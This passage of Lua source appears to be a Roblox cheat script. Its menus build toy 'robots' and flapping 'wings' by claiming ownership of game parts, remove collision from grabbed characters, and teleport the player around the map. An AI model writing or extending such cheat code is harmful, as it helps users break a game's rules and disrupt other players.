            counterLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
        else
            counterLabel.TextColor3 = Color3.fromRGB(139, 90, 43)
        end
    end
end

function startRobot()
    counterLabel = createCounterUI()
    heartbeatConnection = RunService.RenderStepped:Connect(function()
        if not Config.ROBOT_ACTIVE then return end
        updateRobotPositions()
    end)
    
    scanLoop = task.spawn(function()
        while true do
            if Config.ROBOT_ACTIVE then
                local char = LocalPlayer.Character
                if char and char.PrimaryPart then
                    local rootPos = char.PrimaryPart.Position
                    local toyFolder = getCurrentToyFolder()
                    
                    if toyFolder then
                        for _, model in ipairs(toyFolder:GetChildren()) do
                            if model:IsA("Model") then
                                local shouldUse = Config.USE_ALL_TOYS or model.Name == Config.TOY_TYPE
                                
                                if shouldUse then
                                    local soundPart = model:FindFirstChild("SoundPart")
                                    if soundPart and (soundPart.Position - rootPos).Magnitude <= Config.SCAN_RADIUS then
                                        if not isOwned(soundPart) and not activeToys[soundPart] then
                                            local now = tick()
                                            local last = recentParts[soundPart]
                                            
                                            if not last or (now - last > 0.2) then
                                                recentParts[soundPart] = now
                                                claimPartOwner(soundPart)
                                                task.wait(0.05)
                                                
                                                if isOwned(soundPart) then
                                                    assignToyToRobot(soundPart)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait(Config.SCAN_DELAY)
        end
    end)
end

function stopRobot()
    if heartbeatConnection then
        heartbeatConnection:Disconnect()
        heartbeatConnection = nil
    end
    
    cleanupRobot()
    
    if counterLabel and counterLabel.Parent then
        counterLabel.Parent.Parent:Destroy()
        counterLabel = nil
    end
end

RobotSection = ToyTab:CreateSection("Robot")

getgenv().NoclipGrabConnection = nil
GrabLinesTa = ToyTab:CreateToggle({
    Name = 'Noclip Grab	',
    CurrentValue = false,
    Flag = "ToggleNoclipGrab",
    Callback = function(v)
        if getgenv().NoclipGrabConnection then
            getgenv().NoclipGrabConnection:Disconnect()
            getgenv().NoclipGrabConnection = nil
        end
        local function GetGrabbedCharacter()
            local g = workspace:FindFirstChild("GrabParts")
            if not g then return nil end
            local gp = g:FindFirstChild("GrabPart")
            if not gp then return nil end
            local weld = gp:FindFirstChild("WeldConstraint") or gp:FindFirstChild("Weld")
            if not weld then return nil end
            return weld.Part1 and weld.Part1.Parent or nil
        end
        if not v then
            local char = GetGrabbedCharacter()
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") and not part.Anchored then part.CanCollide = true end
                end
            end
            return
        end
        getgenv().NoclipGrabConnection = RunService.Heartbeat:Connect(function()
            local char = GetGrabbedCharacter()
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") and not part.Anchored then part.CanCollide = false end
                end
            end
        end)
    end,
})

ToyTab:CreateDivider()

RobotToggle = ToyTab:CreateToggle({
    Name = "Activate Robot (if you wanna appear tall put shuriken under u and type ;hipheight 25 with iy and set robot hight to 25 or smt)",
    CurrentValue = false,
    Flag = "RobotToggle",
    Callback = function(Value)
        Config.ROBOT_ACTIVE = Value
        if Value then
            if not counterLabel then
                startRobot()
            end
        else
            cleanupRobot()
            Rayfield:Notify({
                Title = "Robot Deactivated",
                Content = "Robot stopped",
                Duration = 3,
                Image = 4483362458,
            })
        end
    end,
})

 ResetButton = ToyTab:CreateButton({
    Name = "Reset Robot",
    Callback = function()
        cleanupRobot()
    end,
})


SettingsSection = ToyTab:CreateSection("Robot Settings")

 ScaleSlider = ToyTab:CreateSlider({
    Name = "Robot Scale",
    Range = {0.5, 30},
    Increment = 0.1,
    Suffix = "x",
    CurrentValue = 1,
    Flag = "RobotScale",
    Callback = function(Value)
        Config.ROBOT_SCALE = Value
        for limbName, limbData in pairs(RobotParts) do
            limbData.positions = generateLimbPositions(limbName, limbData.count)
        end
    end,
})

 ScanRadiusSlider = ToyTab:CreateSlider({
    Name = "Scan Radius",
    Range = {20, 100},
    Increment = 5,
    Suffix = " studs",
    CurrentValue = 50,
    Flag = "ScanRadius",
    Callback = function(Value)
        Config.SCAN_RADIUS = Value
    end,
})


 ToyTab:CreateSection("Wings")

 Players = game.Players
 LocalPlayer = Players.LocalPlayer
 RunService = game:GetService("RunService")


 WingsEnabled = false
 speed = 2
 angle = 30
 wingRadius = 4.1250085830688477
 selectedToy = "HayBale"
 flapAnimation = true
 animationMode = "Idle"
 wingType = "Normal"

burstActive = false
 burstTimer = 0
burstCooldown = 0
 dampingFactor = 1
 chirpTime = 0
 figureEightPhase = 0

 offsets = {
    [1] = CFrame.new(-wingRadius, 0, 1),
    [2] = CFrame.new(wingRadius, 0, 1)
}

seraphimOffsets = {
    [1] = CFrame.new(-wingRadius * 1.2, 0, 0),
    [2] = CFrame.new(wingRadius * 1.2, 0, 0),
    [3] = CFrame.new(-wingRadius * 0.8, wingRadius * 1.5, 0),
    [4] = CFrame.new(wingRadius * 0.8, wingRadius * 1.5, 0),
    [5] = CFrame.new(-wingRadius * 0.6, -wingRadius * 1.2, 0),
    [6] = CFrame.new(wingRadius * 0.6, -wingRadius * 1.2, 0)
}

 dragonOffsets = {
    [1] = CFrame.new(-wingRadius * 1.5, wingRadius * 0.3, 0.5) * CFrame.Angles(0, math.rad(-15), 0),
    [2] = CFrame.new(wingRadius * 1.5, wingRadius * 0.3, 0.5) * CFrame.Angles(0, math.rad(15), 0)
}

 batOffsets = {
    [1] = CFrame.new(-wingRadius * 1.3, wingRadius * 0.2, 0.3) * CFrame.Angles(math.rad(10), math.rad(-20), 0),
    [2] = CFrame.new(wingRadius * 1.3, wingRadius * 0.2, 0.3) * CFrame.Angles(math.rad(10), math.rad(20), 0)
}

 Character = {}
setmetatable(Character, {
    __index = function(_, k)
        local v = LocalPlayer.Character[k]
        if typeof(v) == "function" then
            return function(_, ...)
                return v(LocalPlayer.Character, ...)
            end
        end
        return v
    end,
    __newindex = function(_, k, v)
        LocalPlayer.Character[k] = v
    end
})

 Wings = {}
 RenderConnection = nil

function updateRequiredToys()
    local required = 10
    if wingType == "Seraphim" then required = 18
    elseif wingType == "Dragon" then required = 10
    elseif wingType == "Bat" then required = 14 end
    ToyTab:CreateLabel("Required: " .. required .. " " .. selectedToy, 4483362458, Color3.fromRGB(255, 200, 100), false)
end

 CounterLabel = ToyTab:CreateLabel("Collected: 0 / 10", 4483362458, Color3.fromRGB(100, 200, 255), false)

 function CP()
    local Part = Instance.new("Part")
    Part.CanCollide = false
    Part.Anchored = true
    Part.Transparency = 1
    Part.Size = Vector3.new(4,1,4)
    Part.Parent = workspace
    return Part
end

 function CBM(Part)
    if Part:FindFirstChildOfClass("BodyPosition") then return Part:FindFirstChildOfClass("BodyPosition") end
    if Part:FindFirstChildOfClass("BodyGyro") then return Part:FindFirstChildOfClass("BodyGyro") end
    local BP = Instance.new("BodyPosition")
    local BG = Instance.new("BodyGyro")
    BP.P = 15000
    BP.D = 200
    BP.MaxForce = Vector3.new(1, 1, 1) * 1e10
    BP.Parent = Part
    BG.P = 15000
    BG.D = 200
    BG.MaxTorque = Vector3.new(1, 1, 1) * 1e10
    BG.Parent = Part
    return BG, BP
end

function CleanupWings()
    for _, Wing in ipairs(Wings) do
        if Wing.Handle then Wing.Handle:Destroy() end
        for _, Segment in ipairs(Wing.Segments) do
            if Segment.Part then Segment.Part:Destroy() end
        end
        if Wing.Reserved then
            if Wing.Reserved.BG then Wing.Reserved.BG:Destroy() end
            if Wing.Reserved.BP then Wing.Reserved.BP:Destroy() end
        end
        for _, Sync in ipairs(Wing.Sync) do
            if Sync.BG then Sync.BG:Destroy() end
            if Sync.BP then Sync.BP:Destroy() end
        end
    end
    Wings = {}
    if RenderConnection then
        RenderConnection:Disconnect()
        RenderConnection = nil
    end
end

 function SetupWings()
    CleanupWings()
    local ToysRaw = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    if not ToysRaw then return end
    local Toys = {}
    for i, Toy in ToysRaw:GetChildren() do
        if Toy:IsA("Model") then
            table.insert(Toys, Toy)
        end
    end
    local numWings = 2
    local segmentsPerWing = 5
    if wingType == "Seraphim" then numWings = 6 segmentsPerWing = 3
    elseif wingType == "Dragon" then numWings = 2 segmentsPerWing = 5
    elseif wingType == "Bat" then numWings = 2 segmentsPerWing = 7 end
    for i = 1, numWings do
        local Segments = {}
        for x=1, segmentsPerWing do
            local Segment = {Part = CP()}
            Segments[#Segments+1] = Segment
        end
        Wings[#Wings+1] = {
            Handle = CP(),
            Segments = Segments,
            Sync = {}
        }
    end
    local collectedCount = 0
    local wingIndex = 1
    for i= 1, #Toys do
        local v = Toys[i]
        if v:IsA("Model") and v.Name == selectedToy then
            if wingIndex > numWings then break end
            local Pallet = v:FindFirstChild("SoundPart")
            for _, child in pairs(v:GetChildren()) do
                if child:IsA("BasePart") then
                    child.CanCollide = false
                end
            end
            if Pallet then
                local BG, BP = CBM(Pallet)
                local PalletTable = {
                    BG = BG,
                    BP = BP,
                    Pallet = Pallet
                }
                if Wings[wingIndex].Reserved then 
                    table.insert(Wings[wingIndex].Sync, PalletTable)
                    if #Wings[wingIndex].Sync >= segmentsPerWing - 1 then
                        wingIndex = wingIndex + 1
                    end
                else
                    Wings[wingIndex].Reserved = PalletTable 
                end
                collectedCount = collectedCount + 1
            end
        end
    end
    local required = 10
    if wingType == "Seraphim" then required = 18
    elseif wingType == "Dragon" then required = 10
    elseif wingType == "Bat" then required = 14 end
    CounterLabel:Set("Collected: " .. collectedCount .. " / " .. required)
end

 Toggle = ToyTab:CreateToggle({
   Name = "Enable Wings",
   CurrentValue = false,
   Flag = "WingsToggle",
   Callback = function(Value)
       WingsEnabled = Value
       if Value then
           SetupWings()
           local time = 0
           RenderConnection = RunService.RenderStepped:Connect(function(dt)
               if not WingsEnabled then return end
               time = time + dt * (speed + (Character.HumanoidRootPart.Velocity.Magnitude / 40))
               
               if animationMode == "Burst Flap" then
                   burstCooldown = burstCooldown - dt
                   if burstCooldown <= 0 then
                       burstActive = true
                       burstTimer = 0.8
                       burstCooldown = 2.5
                   end
                   if burstActive then
                       burstTimer = burstTimer - dt
                       if burstTimer <= 0 then burstActive = false end
                   end
               end
               
               if animationMode == "Damped Landing" then
                   dampingFactor = math.max(0.1, dampingFactor - dt * 0.3)
               else
                   dampingFactor = 1
               end
               
               if animationMode == "Chirp Sweep" then
                   chirpTime = chirpTime + dt
               end
               
               for i, Wing in ipairs(Wings) do
                   task.spawn(function()
                       if not Wing.Reserved then return end
                       local direction = (i % 2 == 1) and 1 or -1
                       local flap = 0
                       local currentOffsets = offsets
                       if wingType == "Seraphim" then currentOffsets = seraphimOffsets
                       elseif wingType == "Dragon" then currentOffsets = dragonOffsets
                       elseif wingType == "Bat" then currentOffsets = batOffsets end
                       local wingOffset = currentOffsets[i] or currentOffsets[1]
                       
                       if flapAnimation then
            
                           if animationMode == "Bird Flapping" then
                               local phaseOffset = (i % 2 == 0) and math.pi or 0
                               flap = math.sin(time * 2 + phaseOffset) * math.rad(45) * direction
                           
                           elseif animationMode == "Seagull Glide" then
                               local slowFlap = math.sin(time * 0.7) * math.rad(20) * direction
                               local glide = math.rad(5) * direction
                               flap = (math.abs(math.sin(time * 0.7)) > 0.8) and slowFlap or glide
                           
                           elseif animationMode == "Hummingbird Hover" then
                               flap = math.sin(time * 35) * math.rad(8) * direction
                           
                           elseif animationMode == "Bat Flap" then
                               local batFreq = 4
                               local articulation = math.sin(time * batFreq) * math.rad(60) * direction
                               local finger = math.sin(time * batFreq * 2) * math.rad(10) * direction
                               flap = articulation + finger
                           
                           elseif animationMode == "Insect Flutter" then
                               local irregular = math.sin(time * 100 + math.random()) * math.rad(6) * direction
                               local asymmetric = (i % 2 == 0) and math.rad(2) or -math.rad(2)
                               flap = irregular + asymmetric
                           
                           elseif animationMode == "Dragon Flapping" then
                               local dragonFreq = 1.2
                               local powerFlap = math.sin(time * dragonFreq) * math.rad(70) * direction
                               local twist = math.sin(time * dragonFreq * 2) * math.rad(15) * direction
                               local wingTip = math.sin(time * dragonFreq + math.pi/3) * math.rad(20) * direction
                               flap = powerFlap + twist + wingTip
                           
                           elseif animationMode == "Angel Wings" then
                               local graceful = math.sin(time * 1.1) * math.rad(40) * direction
                               local ripple = math.sin(time * 2.2) * math.rad(5) * direction
                               flap = graceful + ripple
                           
                        
                           elseif animationMode == "Flap-and-Glide" then
                               local cycle = time % 3
                               if cycle < 1 then
                                   flap = math.sin(time * 3) * math.rad(angle) * direction
                               else
                                   flap = math.rad(10) * direction
                               end
                           
                           elseif animationMode == "Burst Flap" then
                               if burstActive then
                                   flap = math.sin(time * 8) * math.rad(angle * 1.5) * direction
                               else
                                   flap = math.rad(10) * direction
                               end
                           
                           elseif animationMode == "Figure-Eight" then
                               figureEightPhase = time * 2
                               local xMove = math.sin(figureEightPhase) * math.rad(angle) * direction
                               local yMove = math.sin(figureEightPhase * 2) * math.rad(angle * 0.5)
                               flap = xMove + yMove
                           
                           elseif animationMode == "Asymmetric Flap" then
                               local offset = (i % 2 == 0) and math.pi/3 or 0
                               flap = math.sin(time * 2 + offset) * math.rad(angle) * direction

                           elseif animationMode == "Sine Wave Flapping" then
                               flap = math.sin(time * 2) * math.rad(angle) * direction
                           
                           elseif animationMode == "Triangle Flap" then
                               local triangleTime = (time * 2) % (math.pi * 2)
                               local triangleWave
                               if triangleTime < math.pi then
                                   triangleWave = (triangleTime / math.pi) * 2 - 1
                               else
                                   triangleWave = 1 - ((triangleTime - math.pi) / math.pi) * 2
                               end
                               flap = triangleWave * math.rad(angle * 1.3) * direction
                           
                           elseif animationMode == "Damped Landing" then
                               flap = math.sin(time * 2) * math.rad(angle) * dampingFactor * direction
                           
                           elseif animationMode == "Chirp Sweep" then
                               local sweepFreq = 1 + (chirpTime * 0.5)
                               flap = math.sin(time * sweepFreq) * math.rad(angle) * direction
                           
                           elseif animationMode == "Phase-Offset Flap" then
                               local phaseOffset = (i % 2 == 0) and math.pi or 0
                               flap = math.sin(time * 2 + phaseOffset) * math.rad(angle) * direction
                           
                        
                           elseif animationMode == "Windmill Flap" then
                               local windmillSpeed = 3
                               flap = (time * windmillSpeed) % (math.pi * 2) * direction
                               local bladeEffect = math.sin(time * windmillSpeed * 4) * math.rad(5)
                               flap = flap + bladeEffect
                           
                           elseif animationMode == "Piston Flap" then
                               local pistonCycle = math.floor(time * 2) % 2
                               flap = (pistonCycle == 0) and math.rad(angle) * direction or -math.rad(angle * 0.5) * direction
                               local impact = (time * 2) % 1 < 0.1 and math.rad(5) * direction or 0
                               flap = flap + impact
                           
                           elseif animationMode == "Ethereal Flap" then
                               local slow = math.sin(time * 0.8) * math.rad(35) * direction
                               local ethereal = math.sin(time * 4) * math.rad(8) * direction
                               flap = slow + ethereal
                           
                           elseif animationMode == "Mechanical Dragon" then
                               local phaseOffset = (i % 2 == 0) and math.pi or 0
                               local heavyFlap = math.floor(math.sin(time * 1.5 + phaseOffset) + 0.5) * math.rad(angle * 1.2) * direction
                               local mechanicalSnap = math.sin(time * 8 + phaseOffset) * math.rad(angle * 0.15) * direction
                               local clank = (math.abs(math.sin(time * 1.5 + phaseOffset)) < 0.1) and math.rad(5) * direction or 0
                               flap = heavyFlap + mechanicalSnap + clank
                           
                           else -- Idle
                               flap = math.sin(time) * math.rad(angle + (Character.HumanoidRootPart.Velocity.Magnitude/4)) * direction
                           end
                       end
                       
                       local rotation = CFrame.Angles(0, 0, flap)
                       if wingType == "Seraphim" then
                           if i <= 2 then rotation = CFrame.Angles(0, 0, flap)
                           elseif i <= 4 then rotation = CFrame.Angles(0, 0, flap) * CFrame.Angles(math.rad(-30), 0, 0)
                           else rotation = CFrame.Angles(0, 0, flap) * CFrame.Angles(math.rad(30), 0, 0) end
                       elseif wingType == "Dragon" then
                           rotation = CFrame.Angles(math.rad(5), 0, flap)
                       elseif wingType == "Bat" then
                           rotation = CFrame.Angles(math.rad(10), 0, flap)
                       end
                       
                       Wing.Handle.CFrame = Character.Torso.CFrame * wingOffset * rotation
                       Wing.Reserved.BP.Position = Wing.Handle.Position
                       Wing.Reserved.BG.CFrame = Wing.Handle.CFrame * CFrame.Angles(math.rad(90), 0, math.rad(90))
                       
                       for Index, Segment in Wing.Segments do
                           local ToFollow = (Index == 1) and Wing.Handle.CFrame or Wing.Segments[Index-1].Part.CFrame
                           local segmentFlap = 0
                           
                           if string.find(animationMode, "Flap") or string.find(animationMode, "Wave") or string.find(animationMode, "Dragon") then
                               segmentFlap = math.sin(time * 2 - (Index * 0.4)) * math.rad(angle * 0.2) * direction
                           end
                           
                           local segmentRotation = CFrame.Angles(0, 0, segmentFlap)
                           Segment.Part.CFrame = Segment.Part.CFrame:Lerp(ToFollow * wingOffset * segmentRotation, 0.5)
                           
                           if Wing.Sync[Index] then
                               Wing.Sync[Index].BP.Position = Segment.Part.Position
                               Wing.Sync[Index].BG.CFrame = Segment.Part.CFrame * CFrame.Angles(math.rad(90), 0, math.rad(90))
                           end
                       end
                   end)
               end
           end)
       else
           CleanupWings()
       end
   end,
})

 Section = ToyTab:CreateSection("Wing Type")

 WingTypeDropdown = ToyTab:CreateDropdown({
   Name = "Wing Configuration",
   Options = {"Normal", "Seraphim", "Dragon", "Bat"},
   CurrentOption = {"Normal"},
   MultipleOptions = false,
   Flag = "WingType",
   Callback = function(Option)
       wingType = Option[1]
       updateRequiredToys()
       if WingsEnabled then SetupWings() end
   end,
})

Section2 = ToyTab:CreateSection("Wing Settings")

 FlapToggle = ToyTab:CreateToggle({
   Name = "Flapping Animation",
   CurrentValue = true,
   Flag = "FlapAnimation",
   Callback = function(Value)
       flapAnimation = Value
   end,
})

 AnimationDropdown = ToyTab:CreateDropdown({
   Name = "Animation Style",
   Options = {
       "Idle",
       "Natural Styles ",
       "Bird Flapping",
       "Seagull Glide",
       "Hummingbird Hover",
       "Bat Flap",
       "Insect Flutter",
       "Dragon Flapping",
       "Angel Wings",
       "Behavior Patterns",
       "Flap-and-Glide",
       "Burst Flap",
       "Figure-Eight",
       "Asymmetric Flap",
       "Mathematical",
       "Sine Wave Flapping",
       "Triangle Flap",
       "Damped Landing",
       "Chirp Sweep",
       "Phase-Offset Flap",
       "Mechanical/Fantastic",
       "Windmill Flap",
       "Piston Flap",
       "Ethereal Flap",
       "Mechanical Dragon"
   },
   CurrentOption = {"Idle"},
   MultipleOptions = false,
   Flag = "AnimationMode",
   Callback = function(Option)
       animationMode = Option[1]
       burstActive = false
       burstTimer = 0
       burstCooldown = 0
       dampingFactor = 1
       chirpTime = 0
   end,
})

SpeedSlider = ToyTab:CreateSlider({
   Name = "Flap Speed",
   Range = {0.5, 20},
   Increment = 0.5,
   Suffix = "x",
   CurrentValue = 2,
   Flag = "WingSpeed",
   Callback = function(Value)
       speed = Value
   end,
})

 AngleSlider = ToyTab:CreateSlider({
   Name = "Flap Angle",
   Range = {5, 100},
   Increment = 5,
   Suffix = "°",
   CurrentValue = 30,
   Flag = "WingAngle",
   Callback = function(Value)
       angle = Value
   end,
})

 RadiusSlider = ToyTab:CreateSlider({
   Name = "Wing Distance",
   Range = {0.5, 50},
   Increment = 0.5,
   Suffix = " studs",
   CurrentValue = 4.1,
   Flag = "WingRadius",
   Callback = function(Value)
       wingRadius = Value
       offsets = {
           [1] = CFrame.new(-wingRadius, 0, 1),
           [2] = CFrame.new(wingRadius, 0, 1)
       }
       seraphimOffsets = {
           [1] = CFrame.new(-wingRadius * 1.2, 0, 0),
           [2] = CFrame.new(wingRadius * 1.2, 0, 0),
           [3] = CFrame.new(-wingRadius * 0.8, wingRadius * 1.5, 0),
           [4] = CFrame.new(wingRadius * 0.8, wingRadius * 1.5, 0),
           [5] = CFrame.new(-wingRadius * 0.6, -wingRadius * 1.2, 0),
           [6] = CFrame.new(wingRadius * 0.6, -wingRadius * 1.2, 0)
       }
       dragonOffsets = {
           [1] = CFrame.new(-wingRadius * 1.5, wingRadius * 0.3, 0.5) * CFrame.Angles(0, math.rad(-15), 0),
           [2] = CFrame.new(wingRadius * 1.5, wingRadius * 0.3, 0.5) * CFrame.Angles(0, math.rad(15), 0)
       }
       batOffsets = {
           [1] = CFrame.new(-wingRadius * 1.3, wingRadius * 0.2, 0.3) * CFrame.Angles(math.rad(10), math.rad(-20), 0),
           [2] = CFrame.new(wingRadius * 1.3, wingRadius * 0.2, 0.3) * CFrame.Angles(math.rad(10), math.rad(20), 0)
       }
   end,
})
ToyDropdown = ToyTab:CreateDropdown({
   Name = "Toy Type",
   Options = {"HayBale", "PalletLightBrown", "LadderLightBrown", "TetracubeI", "DrawerLightBrown"},
   CurrentOption = {"HayBale"},
   MultipleOptions = false,
   Flag = "ToyType",
   Callback = function(Option)
       selectedToy = Option[1]
       updateRequiredToys()
       if WingsEnabled then SetupWings() end
   end,
})

 Section3 = ToyTab:CreateSection("Quick Actions")

 FoldButton = ToyTab:CreateButton({
   Name = "Fold Wings (X)",
   Callback = function()
       offsets = {
           [1] = CFrame.new(-0.1, 0, 1),
           [2] = CFrame.new(0.1, 0, 1)
       }
       wingRadius = 0.1
       RadiusSlider:Set(0.1)
   end,
})

 UnfoldButton = ToyTab:CreateButton({
   Name = "Unfold Wings",
   Callback = function()
       offsets = {
           [1] = CFrame.new(-4.1, 0, 1),
           [2] = CFrame.new(4.1, 0, 1)
       }
       wingRadius = 4.1
       RadiusSlider:Set(4.1)
   end,
})

ReloadButton = ToyTab:CreateButton({
   Name = "Reload Wings",
   Callback = function()
       if WingsEnabled then
           SetupWings()
       end
   end,
})



local tpland = {
    Spawn = CFrame.new(0, -7.35, 0),
    SpawnCave = CFrame.new(-90, 14.6, -314.3),
    GreenHouse = CFrame.new(-538, -7, 74),
    PinkHouse = CFrame.new(-478, -7, -147),
    Barn = CFrame.new(-228, 82, -318),
    BlueHouse = CFrame.new(496, 83, -350),
    ChineseHouse = CFrame.new(542, 123, -93),
    PurpleHouse = CFrame.new(270, -7, 448),
    Factory = CFrame.new(134, 347, 352),
    OtherGreenHouse = CFrame.new(-359, 98, 357),
    BigCave = CFrame.new(-245, 80, 485),
    GoodPrison = CFrame.new(569.6, -7, 176.3),
    RuhubsDogAhhPrison = CFrame.new(564, 82.5, 210),
    ExtremelyGoodPrison = CFrame.new(525, 76, 56),
    TrainCave = CFrame.new(536.6, 87.5, -169.5),
    IslandCave = CFrame.new(75.8, 323, 368.5),
    ChineseRoof = CFrame.new(592, 153, -100),
    UfoCave = CFrame.new(29.6, 10.5, -225.8),
    Prison = CFrame.new(195, -7, -561),
    BlueHouseSlot = CFrame.new(562.2, 85.38, -212.56),
    SpawnSlot = CFrame.new(51.75, -5.3, -121.64),
    HauntedSlot = CFrame.new(164.57, -5.43, 530.97),
    RandomSlot = CFrame.new(-211.65, 85.7, 426.72),
    BeachSlot = CFrame.new(-546.97, -5.3, -41.09)
}

dick = Instance.new("Folder")
dick.Parent = game.Workspace
dick.Name = "PlotItems"

PlayerTab:CreateButton({
    Name = "Go To Spawn",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["Spawn"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to Spawn",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To SpawnCave",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["SpawnCave"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to SpawnCave",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To GreenHouse",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["GreenHouse"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to GreenHouse",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To PinkHouse",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["PinkHouse"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to PinkHouse",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To Barn",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["Barn"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to Barn",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To BlueHouse",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["BlueHouse"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to BlueHouse",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To ChineseHouse",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["ChineseHouse"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to ChineseHouse",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To PurpleHouse",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["PurpleHouse"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to PurpleHouse",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To Factory",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["Factory"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to Factory",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To OtherGreenHouse",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["OtherGreenHouse"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to OtherGreenHouse",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To BigCave",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["BigCave"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to BigCave",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To GoodPrison",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["GoodPrison"]
            Rayfield:Notify({
                Title = "Teleportation",
                Content = player.Name .. " was sent to GoodPrison",
                Duration = 6.5,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Cannot teleport: Character or HumanoidRootPart not found",
                Duration = 6.5,
                Image = 4483362458,
            })
        end
    end,
})

PlayerTab:CreateButton({
    Name = "Go To RuhubsDogAhhPrison",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = tpland["RuhubsDogAhhPrison"]
            Rayfield:Notify({
